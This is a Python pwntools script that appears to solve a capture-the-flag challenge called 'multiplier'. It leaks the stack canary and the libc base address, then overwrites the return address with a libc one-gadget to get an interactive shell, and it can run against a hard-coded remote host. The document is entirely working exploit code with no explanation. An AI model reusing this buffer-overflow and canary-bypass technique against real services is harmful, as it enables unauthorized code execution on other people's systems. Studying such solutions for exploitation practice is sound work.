#!/usr/bin/env python
from pwn import *
import random

def send(payload, index):
    s.recvline()
    payload = int(payload.encode('hex'), 0x10)
    target = (payload + 1 << index * 8) - 1
    while True:
        x = 1
        barray = []
        while True:
            y = min(target / x, random.randint(0, 0xff)) | 1
            if y == 1:
                break
            x *= y
            barray.append(y)
        if x >> index * 8 == payload:
            break
    for val in barray:
        s.sendline(str(val))
    s.sendline('0')
    return s.recvline(False)

def send_payload(payload):
    for i, byte in list(enumerate(payload))[:0x17:-1]:
        x = byte
        while payload[i-1] == '\0':
            x += '\0'
            i -= 1
        send(x, i)

if len(sys.argv) == 1:
    s = process('./multiplier', env = {'LD_PRELOAD': './libc-2.27.so'})
else:
    s = remote('34.85.75.40', 30002)

s.recvline()
canary = int(send('A', 0x18)[-0x40:-0x30], 0x10) & ~0xff
log.info('canary: %#x' % canary)

libc_base = int(send('A', 0x28)[-0x60:-0x50], 0x10) - 0x21b41
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
payload = ''
payload += 'A' * 0x18
payload += p64(canary)
payload += 'A' * 8
payload += p64(libc_base + one_gadgets[0])
payload += 'A'
send_payload(payload)
s.sendline('2')
s.interactive()
